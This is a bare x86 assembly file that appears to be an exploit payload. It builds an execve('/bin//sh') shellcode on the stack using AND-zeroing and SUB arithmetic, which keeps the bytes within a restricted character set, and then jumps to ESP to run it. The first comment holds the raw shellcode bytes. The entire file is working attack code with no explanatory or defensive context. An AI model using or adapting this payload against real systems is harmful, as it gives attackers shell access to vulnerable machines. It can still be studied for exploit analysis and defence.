;31c9f7e1b00b51682f2f7368682f62696e89e3cd80
bits 32
;80cde389
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x2b3d2e24
sub eax, 0x27756f30
sub eax, 0x2c7f7f23

push eax

;6e69622f
push 0x6e69622f

;6868732f
push 0x6868732f

;2f68510b
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x3e40245f
sub eax, 0x22252a60
sub eax, 0x70326036

push eax

;b0e1f7c9
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x607f4740
sub eax, 0x6f234778
sub eax, 0x7f7b797f

push eax

;31414941
push 0x31414941

; jmp to shellcode
jmp esp